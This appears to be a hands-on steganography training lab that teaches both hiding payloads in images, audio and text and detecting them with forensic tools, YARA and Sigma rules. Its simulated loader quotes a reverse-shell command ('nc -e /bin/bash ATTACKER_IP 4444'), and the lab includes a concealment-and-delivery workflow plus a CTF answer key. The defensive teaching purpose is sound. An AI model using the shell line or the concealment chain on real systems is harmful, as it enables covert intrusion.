## Prerequisites

Before starting this lab you must be comfortable with:

- Linux terminal navigation and file permissions
- Python3 scripting (read and modify, not write from scratch)
- Basic networking concepts (IP, ports, HTTP)
- Familiarity with at least one of: Wireshark, Burp Suite, Nmap
- Completed at least one CTF on THM or HTB (Starting Point level minimum)

If you cannot meet all prerequisites, complete **TryHackMe: CC: Pen Testing** and **Linux Fundamentals** paths first.

<div align="center">
  <img src="https://github.com/uzairshahidgithub/STEGO-GHOST-Advanced-Steganography-Payload-Concealment-Detection/blob/main/MITRE-Lab-Daigram.png?raw=true" 
       alt="MITRE Lab Diagram" 
       width="600"/>
</div>

## Environment Setup

### Kali Linux

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install core stego tools
sudo apt install -y steghide zsteg outguess stegosuite exiftool binwalk strings file python3 python3-pip

# Install stegsolve (Java-based: download manually)
wget https://github.com/zardus/ctf-tools/raw/master/stegsolve/install -O install_stegsolve.sh
bash install_stegsolve.sh

# Install stegoVeritas
pip3 install stegoveritas
stegoveritas_install_deps

# Install snow (whitespace steganography)
sudo apt install -y snow

# Install additional tools
sudo apt install -y foremost pngcheck ffmpeg python3-pil

# Verify key installs
steghide --version
binwalk --version
exiftool -ver
python3 --version
```

### Windows VM

Download and install the following (all free):

1. **OpenStego**: [https://www.openstego.com](https://www.openstego.com): GUI stego tool for PNG
2. **snow.exe**: [http://www.darkside.com.au/snow](http://www.darkside.com.au/snow): whitespace stego for text files
3. **DeepSound**: [https://jpinsoft.net/deepsound](https://jpinsoft.net/deepsound): audio steganography
4. **Sysinternals Suite**: [https://docs.microsoft.com/sysinternals](https://docs.microsoft.com/sysinternals): strings.exe, sigcheck.exe
5. **CyberChef**: [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef): runs in browser, no install
6. **HxD Hex Editor**: [https://mh-nexus.de/en/hxd](https://mh-nexus.de/en/hxd): binary inspection
7. **Python 3.x for Windows**: [https://www.python.org/downloads](https://www.python.org/downloads)

### Sample Images

```bash
# Download copyright-free cover images for lab use
mkdir ~/stego_lab && cd ~/stego_lab

wget -O cover_photo.jpg "https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/PNG_transparency_demonstration_1.png/280px-PNG_transparency_demonstration_1.png"

# Or use your own: any JPEG (for steghide) or PNG (for zsteg) works
# Recommended: use a high-resolution JPEG (>500KB) for realistic payload capacity

# Create working directories
mkdir -p ~/stego_lab/{payloads,images,audio,output,forensics,flags}
```


## Tool–Format Compatibility Reference

> **Critical:** Using the wrong tool on the wrong format is the most common student error. Memorise this table.

| Tool | Supported Formats | Primary Use |
|---|---|---|
| `steghide` | **JPEG, BMP only** | Embed/extract with passphrase |
| `zsteg` | **PNG, BMP only** | LSB detection and extraction |
| `outguess` | JPEG | Statistical stego with JPEG DCT |
| `stegsolve` | PNG, BMP, GIF | Visual bit-plane analysis |
| `snow` | **Text files (whitespace)** | Conceal in whitespace between words |
| `OpenStego` | **PNG only** | GUI-based LSB for Windows |
| `DeepSound` | **WAV, MP3, FLAC, APE** | Audio channel concealment |
| `binwalk` | Any binary | File signature scanning and carving |
| `exiftool` | JPEG, PNG, PDF, many | Metadata read/write |
| `strings` | Any binary | Human-readable string extraction |
| `foremost` | Any binary/disk | File carving by header/footer |


## Phase 0: TryHackMe Pre-Lab Rooms

Complete these rooms **in order** before the main lab tasks. Extract the specific skill listed from each room: do not just chase flags mindlessly.

### Room 1: Unstable Twin
**URL:** [https://tryhackme.com/room/unstabletwin](https://tryhackme.com/room/unstabletwin)

**Learning Objective:** Enumerate web-delivered content for hidden embedded data. Practise identifying stego in realistic web scenarios rather than clean CTF setups. Pay close attention to how the room handles file delivery and what distinguishes a clean image from a carrier.

**Skills to Extract:**
- Identifying unexpected file size relative to visible content
- Using `steghide` and `strings` against web-downloaded images
- Recognising passphrase-protected stego containers

**Screenshot Required:** Terminal showing successful extraction with tool and filename visible.



### Room 2: Psychobreak
**URL:** [https://tryhackme.com/room/psychobreak](https://tryhackme.com/room/psychobreak)

**Learning Objective:** Multi-layer puzzle with encoding stacked on top of steganography. This room trains you to resist the instinct to jump straight to tools: context analysis first, tool selection second.

**Skills to Extract:**
- Recognising when Base64/ROT13/hex encoding wraps stego output
- Chaining decoding steps without losing context
- Using CyberChef to pipeline decode operations

**Screenshot Required:** CyberChef pipeline visible with encoded input and plaintext output.



### Room 3: Cicada 3301 Volume 1
**URL:** [https://tryhackme.com/room/cicada3301vol1](https://tryhackme.com/room/cicada3301vol1)

**Learning Objective:** The Cicada 3301 methodology involves layered obfuscation: steganography, custom substitution ciphers, book ciphers and metadata manipulation. This room bridges the gap between CTF-style stego and real adversary tradecraft.

**Skills to Extract:**
- Combining `outguess`, `steghide` and manual analysis in a single investigation chain
- Decoding non-standard alphabets and substitution systems
- Metadata-embedded clue hunting with `exiftool`

**Screenshot Required:** Full terminal session showing the multi-step extraction chain.



## Phase 1: LSB Steganography Theory (Mandatory Read)

### How LSB Works

Every pixel in a digital image is stored as a combination of colour channels. A standard 24-bit RGB pixel uses 8 bits per channel (Red, Green, Blue). The **Least Significant Bit** of each byte contributes only a 1/255 change to colour value: invisible to the human eye.

```
Original pixel Red channel:  10110110  (182)
Modified pixel Red channel:  10110111  (183)  ← 1-bit change, imperceptible
```

Across an image of 1920x1080 pixels with 3 channels, you have **6,220,800 available LSBs**: approximately **777,600 bytes** (~759 KB) of hidden capacity without visible distortion.

### Statistical Detection

LSB manipulation creates a detectable statistical signature: the distribution of 0s and 1s in the LSB plane becomes unnaturally uniform. Tools like `zsteg` and `stegsolve` exploit this. This is why high-quality stego tools (like `steghide`) add noise and use DCT-domain embedding in JPEG rather than raw LSB: harder to detect statistically.

### Key Principle for Advanced Students

Raw LSB in PNG = easy to detect with `zsteg`.
DCT-domain embedding in JPEG (steghide/outguess) = statistically harder to detect.
Audio steganography in WAV using phase encoding = hardest to detect.

Know **why** the tool works, not just **that** it works.



## Phase 2: Offensive Operations (Kali Linux)

### Task 2.1: Prepare Simulated Payload

For this lab the "payload" is a **simulated command** representing what an attacker might conceal. This is not functional malware: it is a demonstration of concealment methodology used in defensive training.

```bash
cd ~/stego_lab/payloads

# Create simulated attacker payload (plaintext command: not executable malware)
cat > stage2_command.txt << 'EOF'
#!/bin/bash
# SIMULATED ATTACKER STAGE-2 LOADER: FOR EDUCATIONAL USE ONLY
# In a real attack this would be: nc -e /bin/bash ATTACKER_IP 4444
# This script only prints to stdout: no network activity
echo "[STEGO-GHOST] Payload extracted successfully"
echo "[STEGO-GHOST] Simulated C2 beacon: 192.168.56.100:4444"
echo "[STEGO-GHOST] Attacker stage-2 command received via steganographic channel"
echo "CIPHER{phase2_payload_extracted_$(date +%s)}"
EOF

echo "Payload file created:"
cat stage2_command.txt
wc -c stage2_command.txt
```

```bash
# Base64-encode the payload before embedding (realistic attacker practice)
base64 stage2_command.txt > stage2_encoded.b64
echo "Encoded payload:"
cat stage2_encoded.b64
```

> **Why Base64 first?** Attackers encode before embedding for two reasons: (1) binary data may corrupt some stego tool outputs, and (2) a defender extracting the stego container sees apparent garbage rather than a readable script: adding a second detection layer to bypass.



### Task 2.2: Steghide: JPEG Concealment (Kali)

```bash
cd ~/stego_lab

# Copy your cover image into the working directory
cp /path/to/your/cover_photo.jpg images/cover_clean.jpg

# Record baseline file size BEFORE embedding
ls -lh images/cover_clean.jpg
md5sum images/cover_clean.jpg

# Embed the base64-encoded payload into JPEG
# -cf = cover file, -ef = embed file, -p = passphrase
steghide embed \
  -cf images/cover_clean.jpg \
  -ef payloads/stage2_encoded.b64 \
  -p "STEGO_GHOST_2024" \
  -sf images/cover_stego.jpg \
  -f

echo "Embed complete. Comparing sizes:"
ls -lh images/cover_clean.jpg images/cover_stego.jpg
md5sum images/cover_stego.jpg
```

```bash
# Verify embed was successful (attacker self-verification)
steghide info images/cover_stego.jpg -p "STEGO_GHOST_2024"
```

> **Expected Output:** steghide should confirm embedded file name, size and encryption type. If it prompts for a passphrase and accepts it: embed was successful.



### Task 2.3: Extraction Simulation (Victim Side)

```bash
# Simulate victim machine receiving and "triggering" the stego image
cd ~/stego_lab

# Step 1: Extract hidden data
steghide extract \
  -sf images/cover_stego.jpg \
  -p "STEGO_GHOST_2024" \
  -xf output/extracted_payload.b64

echo "Extracted file:"
cat output/extracted_payload.b64
```

```bash
# Step 2: Decode Base64
base64 -d output/extracted_payload.b64 > output/decoded_stage2.sh
echo "Decoded payload:"
cat output/decoded_stage2.sh
```

```bash
# Step 3: Simulate execution (safe: only prints)
bash output/decoded_stage2.sh
```

> **Flag 1 location:** Inside the simulated payload output. Record: `CIPHER{phase2_payload_extracted_...}`

---

### Task 2.4: zsteg: PNG Concealment (Kali)

```bash
cd ~/stego_lab

# Acquire a PNG cover image (must be PNG: zsteg does NOT work on JPEG)
wget -O images/cover_png_clean.png "https://www.w3schools.com/css/img_5terre.jpg" 2>/dev/null || \
  convert images/cover_clean.jpg images/cover_png_clean.png

# Write a hidden message into PNG using LSB channel 1
echo "CIPHER{zsteg_lsb_png_channel_red}" > payloads/lsb_flag.txt

# Embed using zsteg (writes directly into LSB plane)
zsteg -E "b1,rgb,lsb,xy" images/cover_png_clean.png > /dev/null 2>&1
# Note: For writing, we use Python PIL: zsteg is primarily a READ/DETECT tool

python3 << 'PYEOF'
from PIL import Image
import struct

def encode_lsb(image_path, message, output_path):
    img = Image.open(image_path).convert("RGB")
    pixels = list(img.getdata())
    message += "<<<END>>>"
    binary_message = ''.join(format(ord(c), '08b') for c in message)
    if len(binary_message) > len(pixels) * 3:
        raise ValueError("Message too large for cover image")
    idx = 0
    new_pixels = []
    for pixel in pixels:
        r, g, b = pixel
        if idx < len(binary_message):
            r = (r & ~1) | int(binary_message[idx]); idx += 1
        if idx < len(binary_message):
            g = (g & ~1) | int(binary_message[idx]); idx += 1
        if idx < len(binary_message):
            b = (b & ~1) | int(binary_message[idx]); idx += 1
        new_pixels.append((r, g, b))
    img.putdata(new_pixels)
    img.save(output_path)
    print(f"[+] Encoded {len(message)} chars into {output_path}")

encode_lsb(
    "images/cover_png_clean.png",
    "CIPHER{zsteg_lsb_png_channel_red}",
    "images/cover_png_stego.png"
)
PYEOF
```

```bash
# Now detect and extract with zsteg
echo "=== zsteg scan output ==="
zsteg images/cover_png_stego.png

# Targeted extraction if detected
zsteg -E "b1,rgb,lsb,xy" images/cover_png_stego.png | strings | head -5
```

> **Flag 2 location:** Extracted from PNG via zsteg scan. Record: `CIPHER{zsteg_lsb_png_channel_red}`

---

### Task 2.5: HTTP Delivery Simulation

This simulates the attacker hosting the stego image on a web server and the victim downloading it.

**Attacker machine (Kali: Terminal 1):**

```bash
cd ~/stego_lab/images

# Start simple HTTP server on port 8080
python3 -m http.server 8080

# Note your IP address
hostname -I | awk '{print $1}'
```

**Victim machine (Kali: Terminal 2, or second VM):**

```bash
# Simulate victim downloading the carrier image
ATTACKER_IP="192.168.56.100"   # Replace with actual IP from above

wget http://${ATTACKER_IP}:8080/cover_stego.jpg -O /tmp/myselfie.jpg

# Verify download
file /tmp/myselfie.jpg
ls -lh /tmp/myselfie.jpg
md5sum /tmp/myselfie.jpg
```

**Network capture (Kali: Terminal 3, run BEFORE download):**

```bash
# Capture the delivery traffic for forensic analysis in Phase 5
sudo tcpdump -i eth0 -w ~/stego_lab/forensics/delivery_capture.pcap port 8080
```

> **Forensic note:** The PCAP captured here is used in Phase 5 (Detection). Do not delete it.

---

### Task 2.6: outguess: JPEG Statistical Stego

```bash
cd ~/stego_lab

# outguess uses DCT domain: statistically harder to detect than raw LSB
echo "CIPHER{outguess_dct_domain_harder_to_detect}" > payloads/outguess_flag.txt

# Embed
outguess -k "outguess_secret_2024" \
  -d payloads/outguess_flag.txt \
  images/cover_clean.jpg \
  images/cover_outguess.jpg

echo "outguess embed complete"
ls -lh images/cover_clean.jpg images/cover_outguess.jpg
```

```bash
# Extract
outguess -k "outguess_secret_2024" \
  -r images/cover_outguess.jpg \
  output/outguess_extracted.txt

cat output/outguess_extracted.txt
```



## Phase 3: Custom Secret Encoding Language (Python3)

### Background

Cicada 3301 and many real APT groups use **custom substitution systems** layered on top of steganography. This phase builds a reusable cipher system, embeds it in an image and requires the student to reverse-engineer both layers without the key.

### Task 3.1: Design the CIPHER Alphabet

The CIPHER alphabet is a 26-character substitution cipher with numeric padding for non-alpha characters.

```
Standard:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
CIPHER:    Q W E R T Y U I O P A S D F G H J K L Z X C V B N M
```

Save this mapping as your **Lab Key**: you will need it for encoding and decoding.



### Task 3.2: Encoder/Decoder Script

Save the following as `~/stego_lab/cipher_codec.py`:

```python
#!/usr/bin/env python3
"""
CIPHER Custom Substitution Codec
Lab: STEGO GHOST: Advanced Steganography
Usage: python3 cipher_codec.py [encode|decode] "your text here"
"""

import sys
import argparse
import base64

# CIPHER alphabet definition
STANDARD = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
CIPHER_A  = "QWERTYUIOPASDFGHJKLZXCVBNM"

# Build forward and reverse lookup tables
ENCODE_MAP = dict(zip(STANDARD, CIPHER_A))
DECODE_MAP = dict(zip(CIPHER_A, STANDARD))

# Add number substitution (shift each digit by 3, wrap at 9)
NUM_ENCODE = {str(i): str((i + 3) % 10) for i in range(10)}
NUM_DECODE = {v: k for k, v in NUM_ENCODE.items()}

# Special marker: wraps the ciphertext to identify CIPHER-encoded content
PREFIX  = ">>CIPHERSTART<<"
SUFFIX  = ">>CIPHEREND<<"


def encode(plaintext: str) -> str:
    result = []
    for char in plaintext.upper():
        if char in ENCODE_MAP:
            result.append(ENCODE_MAP[char])
        elif char in NUM_ENCODE:
            result.append(NUM_ENCODE[char])
        elif char == " ":
            result.append("_")         # Space becomes underscore
        else:
            result.append(char)        # Punctuation unchanged
    ciphertext = "".join(result)
    # Base64 the whole thing for a second obfuscation layer
    b64_layer = base64.b64encode(ciphertext.encode()).decode()
    return f"{PREFIX}{b64_layer}{SUFFIX}"


def decode(ciphertext: str) -> str:
    # Strip markers
    if PREFIX in ciphertext and SUFFIX in ciphertext:
        inner = ciphertext.split(PREFIX)[1].split(SUFFIX)[0]
    else:
        inner = ciphertext.strip()
    # Reverse Base64
    try:
        raw = base64.b64decode(inner.encode()).decode()
    except Exception:
        raw = inner   # Already raw cipher: skip b64 step
    result = []
    for char in raw:
        if char in DECODE_MAP:
            result.append(DECODE_MAP[char])
        elif char in NUM_DECODE:
            result.append(NUM_DECODE[char])
        elif char == "_":
            result.append(" ")
        else:
            result.append(char)
    return "".join(result)


def main():
    parser = argparse.ArgumentParser(description="CIPHER Custom Codec")
    parser.add_argument("mode", choices=["encode", "decode"],
                        help="Operation mode")
    parser.add_argument("text", help="Text to encode or decode")
    parser.add_argument("--raw", action="store_true",
                        help="Skip Base64 layer (raw substitution only)")
    args = parser.parse_args()

    if args.mode == "encode":
        result = encode(args.text)
        print(f"\n[+] CIPHER Encoded:\n{result}\n")
    else:
        result = decode(args.text)
        print(f"\n[+] CIPHER Decoded:\n{result}\n")


if __name__ == "__main__":
    main()
```

```bash
chmod +x ~/stego_lab/cipher_codec.py

# Test encode
python3 ~/stego_lab/cipher_codec.py encode "CIPHER LAB IS ACTIVE"

# Test decode (paste the output from encode above)
python3 ~/stego_lab/cipher_codec.py decode ">>CIPHERSTART<<PASTE_OUTPUT_HERE>>CIPHEREND<<"
```



### Task 3.3: Stacked Concealment: Cipher + Steghide

```bash
cd ~/stego_lab

# Step 1: Encode a secret message with CIPHER codec
python3 cipher_codec.py encode "ATTACKER EXFIL ROUTE IS PORT 443 VIA STEGO CHANNEL" \
  > payloads/encoded_exfil_message.txt

cat payloads/encoded_exfil_message.txt

# Step 2: Embed the CIPHER-encoded output into JPEG with steghide
steghide embed \
  -cf images/cover_clean.jpg \
  -ef payloads/encoded_exfil_message.txt \
  -p "dual_layer_2024" \
  -sf images/cover_dual_layer.jpg \
  -f

echo "Dual-layer stego image created"
```

```bash
# Extraction challenge: reverse BOTH layers
# Layer 1: steghide extract
steghide extract \
  -sf images/cover_dual_layer.jpg \
  -p "dual_layer_2024" \
  -xf output/layer1_extracted.txt

cat output/layer1_extracted.txt

# Layer 2: CIPHER decode
python3 cipher_codec.py decode "$(cat output/layer1_extracted.txt)"
```

> **Flag 3 location:** The decoded plaintext message contains the flag. Record: `CIPHER{dual_layer_attacker_exfil_route_decoded}`



### Task 3.4: Whitespace Steganography with snow (Kali)

`snow` conceals messages by appending invisible tabs and spaces to lines of text. The cover "text file" looks empty or normal in any text editor.

```bash
cd ~/stego_lab

# Create an innocent-looking cover text file
cat > payloads/cover_readme.txt << 'EOF'
Welcome to the STEGO GHOST investigation platform.
This readme contains configuration notes for the analyst.
All systems are operating within normal parameters.
No anomalies detected at this time.
Please proceed with your analysis workflow.
EOF

# Embed hidden message using snow
snow -C -m "CIPHER{snow_whitespace_channel_active}" \
  -p "snow_pass_2024" \
  payloads/cover_readme.txt \
  output/readme_stego.txt

echo "Snow embed complete. File sizes:"
ls -lh payloads/cover_readme.txt output/readme_stego.txt

echo "Visual inspection (looks identical):"
cat output/readme_stego.txt
```

```bash
# Extract hidden snow message
snow -C -p "snow_pass_2024" output/readme_stego.txt
```

> **Flag 4 location:** snow extraction output. Record: `CIPHER{snow_whitespace_channel_active}`



## Phase 4: Windows Steganography Tools

Complete these tasks on your Windows VM. Document each with a screenshot.

### Task 4.1: OpenStego GUI (Windows: PNG only)

1. Launch OpenStego
2. Navigate to **Hide Data** tab
3. **Message File:** Browse to a `.txt` file containing `CIPHER{openstego_windows_png_embed}`
4. **Cover File:** Select any `.png` image (JPEG will be rejected: OpenStego is PNG-only)
5. **Output Stego File:** Save as `output_stego.png` on your Desktop
6. **Password:** `openstego_2024`
7. Click **Hide Data**

**Extraction:**

1. Navigate to **Unhide Data** tab
2. **Input Stego File:** Select `output_stego.png`
3. **Password:** `openstego_2024`
4. Click **Unhide Data**: extracted file saves to output directory
5. Open extracted file and record the flag

> **Flag 5 location:** Extracted text file content from OpenStego. Record: `CIPHER{openstego_windows_png_embed}`

---

### Task 4.2: DeepSound: Audio Steganography (Windows)

1. Launch DeepSound
2. Click **Open carrier files**: select any `.wav` or `.mp3` file
3. Navigate to **Add secret files**: add a `.txt` file containing `CIPHER{deepsound_audio_covert_channel}`
4. Tick **Encrypt secret files**: password: `audio_stego_2024`
5. Click **Encode secret files**: save output as `audio_stego.wav`

**Extraction:**

1. Open `audio_stego.wav` in DeepSound
2. Click **Extract secret files**
3. Enter password: `audio_stego_2024`
4. Open extracted file and record the flag

> **Flag 6 location:** Extracted text file from DeepSound. Record: `CIPHER{deepsound_audio_covert_channel}`


### Task 4.3: snow.exe: Whitespace Stego (Windows CMD)

```cmd
REM Open Command Prompt in the snow.exe directory

REM Create cover text file
echo Analyst report: System scan complete. No threats detected. > cover.txt
echo All processes verified clean. Signature database current. >> cover.txt

REM Embed hidden message
snow.exe -C -m "CIPHER{snow_windows_whitespace}" -p "snow_win_2024" cover.txt output_snow.txt

REM Verify visual appearance
type output_snow.txt

REM Extract
snow.exe -C -p "snow_win_2024" output_snow.txt
```

> **Flag 7 location:** snow.exe extraction output. Record: `CIPHER{snow_windows_whitespace}`



### Task 4.4: HxD Hex Editor: Manual Inspection (Windows)

1. Open `cover_stego.jpg` (transferred from Kali) in HxD
2. Jump to the **end of file** (Ctrl+End)
3. Look for data **after** the JPEG end-of-file marker `FF D9`
4. Any data present after `FF D9` is appended content: a common naive hiding technique
5. Document what you observe (even if nothing is present: "no appended data" is a valid finding)

**Compare using strings (Sysinternals):**

```cmd
REM Sysinternals strings on the stego image
strings.exe -n 8 cover_stego.jpg > strings_output.txt
notepad strings_output.txt
REM Look for: base64 strings, URLs, script fragments, readable sentences
```


## Phase 5: Defensive Detection & Forensic Analysis

### Task 5.1: File Analysis with ExifTool

```bash
cd ~/stego_lab

echo "=== EXIFTOOL ANALYSIS ==="
exiftool images/cover_stego.jpg

echo ""
echo "=== KEY FIELDS TO EXAMINE ==="
exiftool -FileSize -ImageSize -ColorSpace -Comment -UserComment \
  -Software -CreatorTool images/cover_stego.jpg

# Compare metadata between clean and stego versions
echo ""
echo "=== METADATA DIFF: CLEAN vs STEGO ==="
exiftool images/cover_clean.jpg > /tmp/meta_clean.txt
exiftool images/cover_stego.jpg > /tmp/meta_stego.txt
diff /tmp/meta_clean.txt /tmp/meta_stego.txt
```

**Questions to answer:**
1. Is the file size anomalous relative to image dimensions?
2. Does `Comment` or `UserComment` field contain unexpected data?
3. Is the `Software` field consistent with the camera/creator claimed?
4. Does the `ColorSpace` match expected values for the stated format?



### Task 5.2: Entropy Analysis with binwalk

```bash
cd ~/stego_lab

echo "=== SIGNATURE SCAN ==="
binwalk images/cover_stego.jpg

echo ""
echo "=== ENTROPY ANALYSIS ==="
binwalk -E images/cover_stego.jpg
# HIGH entropy (close to 1.0) = compressed or encrypted data = suspicious
# Natural image entropy typically 0.7-0.9, uniform high entropy = stego indicator

echo ""
echo "=== FILE CARVING (extract embedded content) ==="
binwalk -e images/cover_stego.jpg --directory=forensics/binwalk_carved/
ls -la forensics/binwalk_carved/
```

**Entropy Interpretation Guide:**

| Entropy Range | Interpretation |
|---|---|
| 0.0 – 0.4 | Mostly null bytes or repetitive data |
| 0.5 – 0.8 | Normal uncompressed data |
| 0.8 – 0.95 | Compressed image (JPEG/PNG normal range) |
| 0.95 – 1.0 | **Encrypted or heavily obfuscated: investigate** |



### Task 5.3: String Analysis

```bash
cd ~/stego_lab

echo "=== STRINGS ANALYSIS (min length 8) ==="
strings -n 8 images/cover_stego.jpg | head -60

echo ""
echo "=== HUNTING FOR BASE64 PATTERNS ==="
strings images/cover_stego.jpg | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'

echo ""
echo "=== HUNTING FOR URLS ==="
strings images/cover_stego.jpg | grep -Ei '(http|ftp|https):\/\/'

echo ""
echo "=== HUNTING FOR SCRIPT FRAGMENTS ==="
strings images/cover_stego.jpg | grep -Ei '(bash|sh|python|powershell|cmd|exec|eval)'

echo ""
echo "=== HUNTING FOR CIPHER MARKERS ==="
strings images/cover_stego.jpg | grep -E '(CIPHERSTART|CIPHEREND|FLAG|CIPHER\{)'
```



### Task 5.4: stegsolve Bit-Plane Analysis (Kali GUI)

```bash
# Launch stegsolve
java -jar /opt/stegsolve/stegsolve.jar
```

1. File > Open > select `cover_png_stego.png`
2. Use **left/right arrows** to cycle through bit planes
3. Stop at **Red plane 0** (LSB of red channel): stego data appears as noise pattern
4. Compare to `cover_png_clean.png` in a second stegsolve window
5. Go to **Analyse > Data Extract**
6. Tick: Red 0, Green 0, Blue 0: Order: Row by Row, MSB First unchecked
7. Click **Preview**: look for readable text in the hex dump

**What you are looking for:** A consistent noise pattern in bit-plane 0 indicating non-random LSB data (steganographic signature).



### Task 5.5: stegoVeritas Full Scan

```bash
cd ~/stego_lab

echo "=== stegoVeritas FULL ANALYSIS ==="
stegoveritas images/cover_stego.jpg -out forensics/stegoveritas_results/

echo ""
echo "=== stegoVeritas on PNG ==="
stegoveritas images/cover_png_stego.png -out forensics/stegoveritas_png_results/

ls forensics/stegoveritas_results/
```

---

### Task 5.6: PCAP Analysis (Wireshark)

```bash
# Analyse the delivery capture from Phase 2 Task 2.5
wireshark ~/stego_lab/forensics/delivery_capture.pcap &

# Alternatively use tshark (CLI)
tshark -r ~/stego_lab/forensics/delivery_capture.pcap \
  -Y "http" \
  -T fields \
  -e http.request.method \
  -e http.request.uri \
  -e http.response.code \
  -e http.content_length
```

**Network Indicators to document:**

1. Source IP and port of the HTTP GET request
2. URI path of the downloaded image
3. File size as reported by HTTP `Content-Length` header
4. Any suspicious `User-Agent` string
5. Timestamp of download



### Task 5.7: YARA Detection Rule

Write a YARA rule that detects steghide-embedded JPEG images by hunting for the steghide signature string and statistical anomalies.

Save as `~/stego_lab/forensics/stego_detect.yar`:

```yara
/*
   YARA Rule: Detect steghide-embedded JPEG images
   Author: CIPHER Lab: STEGO GHOST
   Date: 2024
   Ref: T1027.003: Steganography
   Version: 1.0
*/

rule steghide_embedded_jpeg
{
    meta:
        description  = "Detects JPEG images with steghide embedded payload"
        author       = "CIPHER Lab"
        mitre_attack = "T1027.003"
        severity     = "Medium"

    strings:
        // steghide magic bytes written into the image data stream
        $steghide_magic  = { 73 74 65 67 68 64 }   // 'steghd' hex
        $steghide_string = "steghide"  ascii nocase

        // Base64 content pattern: indicates encoded payload
        $base64_pattern  = /[A-Za-z0-9+\/]{40,}={0,2}/ ascii

        // CIPHER codec markers
        $cipher_start    = ">>CIPHERSTART<<"  ascii
        $cipher_end      = ">>CIPHEREND<<"    ascii

        // JPEG header and footer
        $jpeg_header     = { FF D8 FF }
        $jpeg_footer     = { FF D9 }

    condition:
        $jpeg_header at 0
        and $jpeg_footer
        and (
            $steghide_magic
            or $steghide_string
            or ($cipher_start and $cipher_end)
            or (filesize > 500KB and $base64_pattern)
        )
}


rule suspicious_image_size_anomaly
{
    meta:
        description  = "JPEG with size disproportionate to dimensions: possible stego carrier"
        author       = "CIPHER Lab"
        mitre_attack = "T1027.003"
        severity     = "Low"
        note         = "Tune threshold per environment baseline"

    strings:
        $jpeg_header = { FF D8 FF }

    condition:
        $jpeg_header at 0
        and filesize > 2MB
        and not filename matches /raw|tiff|original/i
}


rule snow_whitespace_stego_textfile
{
    meta:
        description = "Text file with suspicious trailing whitespace on multiple lines: possible snow stego"
        author      = "CIPHER Lab"
        mitre_attack = "T1027.003"

    strings:
        // Trailing tab characters on line endings: snow signature
        $trailing_tab1 = /\t\t\t\n/
        $trailing_tab2 = /[ \t]{4,}\n/

    condition:
        any of them
        and #trailing_tab1 > 3
}
```

```bash
# Test YARA rule against the stego images created in this lab
yara -r ~/stego_lab/forensics/stego_detect.yar ~/stego_lab/images/

# Should match stego versions, NOT clean versions
yara ~/stego_lab/forensics/stego_detect.yar images/cover_stego.jpg
yara ~/stego_lab/forensics/stego_detect.yar images/cover_clean.jpg
```

> **Expected result:** Rule fires on `cover_stego.jpg`, silent on `cover_clean.jpg`



### Task 5.8: Sigma Rule (SIEM Detection)

Write a Sigma rule for detecting suspicious image downloads followed by script execution.

Save as `~/stego_lab/forensics/sigma_stego_delivery.yml`:

```yaml
title: Suspicious Image Download Followed by Script Execution
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
  Detects a pattern consistent with steganographic payload delivery:
  an image file is downloaded via HTTP and within 60 seconds a shell
  or script interpreter executes. Maps to T1027.003 + T1059.
author: CIPHER Lab: STEGO GHOST
date: 2024/01/01
references:
  - https://attack.mitre.org/techniques/T1027/003/
tags:
  - attack.defense_evasion
  - attack.t1027.003
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  image_download:
    CommandLine|contains:
      - '.jpg'
      - '.jpeg'
      - '.png'
      - '.bmp'
    CommandLine|contains:
      - 'wget'
      - 'curl'
  script_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/python3'
      - '/python'
    CommandLine|contains:
      - 'payload'
      - 'extract'
      - 'steghide'
      - 'base64 -d'
  timeframe: 60s
  condition: image_download followed by script_execution
falsepositives:
  - Legitimate automated image processing pipelines
  - Developer CI/CD workflows involving image manipulation
level: high
fields:
  - CommandLine
  - Image
  - ParentImage
  - User
  - Hashes
```



## Phase 6: Independent CTF Challenge (Timed: 90 Minutes)

> **Rules:** No hints until time expires. No collaboration. Work independently. Submit all flags plus a 1-page analysis report.



### Challenge Setup

```bash
cd ~/stego_lab

# Download challenge package (instructor provides: or create your own below)
# For self-study: create the challenge package yourself FIRST then attempt it
# from scratch in a clean directory one week later

mkdir challenge && cd challenge

# Instructor deploys three files:
#   ghost_01.jpg  : contains Flag A (steghide + CIPHER encoded)
#   ghost_02.png  : contains Flag B (LSB manual + outguess layered)
#   ghost_03.wav  : contains Flag C (audio stego + snow encoded text)
#   readme.txt    : contains Flag D (snow whitespace stego)
#   manifest.txt  : cipher-encoded clue pointing to master flag location
```

### Challenge Flags

| Flag | Value | Method | Tool |
|---|---|---|---|
| Flag A | `CIPHER{ghost_01_jpeg_steghide_decoded}` | steghide + CIPHER decode | steghide + cipher_codec.py |
| Flag B | `CIPHER{ghost_02_png_lsb_outguess_stacked}` | LSB + outguess | zsteg + outguess |
| Flag C | `CIPHER{ghost_03_audio_channel_cracked}` | DeepSound or ffmpeg | DeepSound / sox |
| Flag D | `CIPHER{ghost_04_snow_readme_whitespace}` | snow whitespace | snow |
| Master | `CIPHER{STEGO_GHOST_COMPLETE_ALL_LAYERS}` | Composite of A+B+C+D | All tools combined |

### Challenge Questions

Answer all five questions in your incident report:

1. Which steganography method is statistically hardest to detect and why?
2. How would you detect the CIPHER custom codec in a real SIEM environment without prior knowledge of the encoding scheme?
3. What is the maximum payload capacity (in bytes) of a 1920x1080 RGB PNG image using 1-bit LSB per channel?
4. Why does `steghide` use DCT-domain embedding in JPEG rather than spatial-domain LSB?
5. Write one additional YARA rule not provided in this lab that detects a stego indicator of your choice. Justify the logic.



## Deliverables Checklist

Submit all the following as a single PDF document. Screenshots must show your THM profile username, terminal hostname and full browser tab: no crops, no edits, no AI-generated images.

| # | Deliverable | Phase |
|---|---|---|
| 1 | THM: Unstable Twin completion screenshot | Phase 0 |
| 2 | THM: Psychobreak completion screenshot | Phase 0 |
| 3 | THM: Cicada 3301 Vol 1 completion screenshot | Phase 0 |
| 4 | steghide embed/extract terminal output (Kali) | Phase 2 |
| 5 | zsteg PNG detection output | Phase 2 |
| 6 | HTTP delivery PCAP: Wireshark screenshot | Phase 2 |
| 7 | CIPHER codec encode + decode terminal output | Phase 3 |
| 8 | Dual-layer stego chain (cipher + steghide) output | Phase 3 |
| 9 | snow whitespace stego embed + extract (Kali) | Phase 3 |
